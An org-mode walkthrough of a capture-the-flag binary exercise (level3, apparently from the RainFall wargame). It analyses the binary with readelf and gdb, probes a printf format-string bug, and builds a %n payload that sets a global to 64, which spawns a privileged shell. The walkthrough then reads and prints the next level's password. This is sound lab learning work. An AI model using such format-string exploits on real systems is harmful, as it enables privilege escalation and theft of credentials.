#+title: Walkthrough
* Data Gathering

#+begin_src shell
readelf -p .rodata level3

String dump of section '.rodata':
  [     8]  Wait what?!^J
  [    15]  /bin/sh
#+end_src

#+begin_src shell
  gdb -batch  level3 -ex "info functions"  -ex "info variables"
  All defined functions:

  Non-debugging symbols:
  0x08048344  _init
  0x08048390  printf
  0x08048390  printf@plt # Interesting
  0x080483a0  fgets
  0x080483a0  fgets@plt  # Interesting
  0x080483b0  fwrite
  0x080483b0  fwrite@plt
  0x080483c0  system
  0x080483c0  system@plt # Interesting
  0x080483d0  __gmon_start__
  0x080483d0  __gmon_start__@plt
  0x080483e0  __libc_start_main
  0x080483e0  __libc_start_main@plt
  0x080483f0  _start
  0x08048420  __do_global_dtors_aux
  0x08048480  frame_dummy
  0x080484a4  v           # Custom
  0x0804851a  main        # Custom
  0x08048530  __libc_csu_init
  0x080485a0  __libc_csu_fini
  0x080485a2  __i686.get_pc_thunk.bx
  0x080485b0  __do_global_ctors_aux
  0x080485dc  _fini
  All defined variables:

  Non-debugging symbols:
  0x080485f8  _fp_hw
  0x080485fc  _IO_stdin_used
  0x08048734  __FRAME_END__
  0x08049738  __CTOR_LIST__
  0x08049738  __init_array_end
  0x08049738  __init_array_start
  0x0804973c  __CTOR_END__
  0x08049740  __DTOR_LIST__
  0x08049744  __DTOR_END__
  0x08049748  __JCR_END__
  0x08049748  __JCR_LIST__
  0x0804974c  _DYNAMIC
  0x08049818  _GLOBAL_OFFSET_TABLE_
  0x0804983c  __data_start
  0x0804983c  data_start
  0x08049840  __dso_handle
  0x08049860  stdin@@GLIBC_2.0
  0x08049880  stdout@@GLIBC_2.0
  0x08049884  completed.6159
  0x08049888  dtor_idx.6161
  0x0804988c  m  # Look like a global var
  level3@RainFall:~$ 
#+end_src
**  What we got?
a global m
a fwrite may   [     8]  Wait what?!^J
a system may  [    15]  /bin/sh
a function v and main.

* Binary Analisis
#+begin_src shell
gdb -batch  level3 -ex "set disassembly-flavor intel" -ex "disassemble main" -ex "disassemble v" -ex "p &m"
Dump of assembler code for function main:
   0x0804851a <+0>:	push   ebp
   0x0804851b <+1>:	mov    ebp,esp
   0x0804851d <+3>:	and    esp,0xfffffff0
   0x08048520 <+6>:	call   0x80484a4 <v>
   0x08048525 <+11>:	leave  
   0x08048526 <+12>:	ret    
End of assembler dump.
Dump of assembler code for function v:
   0x080484a4 <+0>:	push   ebp
   0x080484a5 <+1>:	mov    ebp,esp
   0x080484a7 <+3>:	sub    esp,0x218
   0x080484ad <+9>:	mov    eax,ds:0x8049860
   0x080484b2 <+14>:	mov    DWORD PTR [esp+0x8],eax
   0x080484b6 <+18>:	mov    DWORD PTR [esp+0x4],0x200
   0x080484be <+26>:	lea    eax,[ebp-0x208]
   0x080484c4 <+32>:	mov    DWORD PTR [esp],eax
   0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>
   0x080484cc <+40>:	lea    eax,[ebp-0x208]
   0x080484d2 <+46>:	mov    DWORD PTR [esp],eax
   0x080484d5 <+49>:	call   0x8048390 <printf@plt>
   0x080484da <+54>:	mov    eax,ds:0x804988c
   0x080484df <+59>:	cmp    eax,0x40
   0x080484e2 <+62>:	jne    0x8048518 <v+116>
   0x080484e4 <+64>:	mov    eax,ds:0x8049880
   0x080484e9 <+69>:	mov    edx,eax
   0x080484eb <+71>:	mov    eax,0x8048600
   0x080484f0 <+76>:	mov    DWORD PTR [esp+0xc],edx
   0x080484f4 <+80>:	mov    DWORD PTR [esp+0x8],0xc
   0x080484fc <+88>:	mov    DWORD PTR [esp+0x4],0x1
   0x08048504 <+96>:	mov    DWORD PTR [esp],eax
   0x08048507 <+99>:	call   0x80483b0 <fwrite@plt>
   0x0804850c <+104>:	mov    DWORD PTR [esp],0x804860d
   0x08048513 <+111>:	call   0x80483c0 <system@plt>
   0x08048518 <+116>:	leave  
   0x08048519 <+117>:	ret    
End of assembler dump.
$1 = (<data variable, no debug info> *) 0x804988c

#+end_src
** What we do:
get the m  va = 0x804988c
Rebuild  [[source]] from  the assembly code of  main  and v
** Tries
*** serch in stack for m  va
if  modify m in printf we could use the program to launch system.
#+begin_src shell
    ./level3
    #Format string
    %p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p\n
    #output result
  0x200|0xb7fd1ac0|0xb7ff37d0|0x257c7025|0x70257c70|0x7c70257c|0x257c7025|0x70257c70|0x7c70257c|0x257c7025|0x70257c70|0x7c70257c|0x257c7025|0x70257c70|0x7c70257c|0x6e5c7025|0xa\n
#+end_src
More tries
#+begin_src shell
./level3
%p|%p|%p|%p
0x200|0xb7fd1ac0|0xb7ff37d0|0x257c7025
level3@RainFall:~$ ./level3
%p|%p|%p|%p|%p
0x200|0xb7fd1ac0|0xb7ff37d0|0x257c7025|0x70257c70
#+end_src
Let's verify "0x257c7025|0x70257c70"  is buffer  fgets write.
#+begin_src shell
       0x080484cc <+40>:	lea    eax,[ebp-0x208]
       0x080484d2 <+46>:	mov    DWORD PTR [esp],eax
       0x080484d5 <+49>:	call   0x8048390 <printf@plt>
       0x080484da <+54>:	mov    eax,ds:0x804988c
       0x080484df <+59>:	cmp    eax,0x40
       0x080484e2 <+62>:	jne    0x8048518 <v+116>
       0x080484e4 <+64>:	mov    eax,ds:0x8049880
       0x080484e9 <+69>:	mov    edx,eax
       0x080484eb <+71>:	mov    eax,0x8048600
       0x080484f0 <+76>:	mov    DWORD PTR [esp+0xc],edx
       0x080484f4 <+80>:	mov    DWORD PTR [esp+0x8],0xc
       0x080484fc <+88>:	mov    DWORD PTR [esp+0x4],0x1
       0x08048504 <+96>:	mov    DWORD PTR [esp],eax
       0x08048507 <+99>:	call   0x80483b0 <fwrite@plt>
       0x0804850c <+104>:	mov    DWORD PTR [esp],0x804860d
       0x08048513 <+111>:	call   0x80483c0 <system@plt>
       0x08048518 <+116>:	leave  
       0x08048519 <+117>:	ret    
    End of assembler dump.
    (gdb) info  symbol ds:0x8049860
    No symbol table is loaded.  Use the "file" command.
    (gdb) info  symbol 0x8049860
    stdin@@GLIBC_2.0 in section .bss
    (gdb) tb * 0x080484cc 
    stdin@@GLIBC_2.0 in section .bss
    (gdb) tb * 0x080484cc
    Temporary breakpoint 2 at 0x80484cc
    (gdb) c
    The program is not being run.
    (gdb) r
    Starting program: /home/user/level3/level3 
    %p%p%p%p%p

    Temporary breakpoint 2, 0x080484cc in v ()
    (gdb) x/s  $eax
    0xbffffa40:	 "%p%p%p%p%p\n"
    (gdb) x/c  $eax
    0xbffffa40:	37 '%'
    (gdb) x/cx  $eax
    0xbffffa40:	0x25
    (gdb) x/2cx  $eax
    0xbffffa40:	0x25	0x70
    (gdb) x/2x  $eax
    0xbffffa40:	0x25	0x70
    (gdb) x/2wx  $eax
    0xbffffa40:	0x70257025	0x70257025
    (gdb) x/4wx  $eax
    0xbffffa40:	0x70257025	0x70257025	0x000a7025	0xb7fef305
    Verify:
  level3@RainFall:~$ ./level3
  %p%p%p%p
  0x2000xb7fd1ac00xb7ff37d00x70257025

#+end_src
**** Result
#+begin_src shell
  We can see the content of the buffer from 4 %p -> then need to got the value of the va 'm' and put in the buffer an with %n set 64 in 'm'
#+end_src
*** Logic:

  4B + 60B = 64 written_Bytes.
  "m(va)+60B+%4$n" ->*mva= 64
  %60 -> is for use width of 60 B use the less ammount of format string for the exploit.
  %4$n -> is for use  the Forth param, n write written_Bytes in the pointer.

#+begin_src shell
python -c 'print "\x08\x04\x98\x8c"[::-1]+"%60p%4$n"'
#+end_src

* Explotation

#+begin_src shell
(python -c 'print "\x08\x04\x98\x8c"[::-1]+"%60p%4$n"'; cat -)| ./level3
Œ˜                                                       0x200
Wait what?!
id
uid=2022(level3) gid=2022(level3) euid=2025(level4) egid=100(users) groups=2025(level4),100(users),2022(level3)
cat /home/user/`whoami`/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
#+end_src
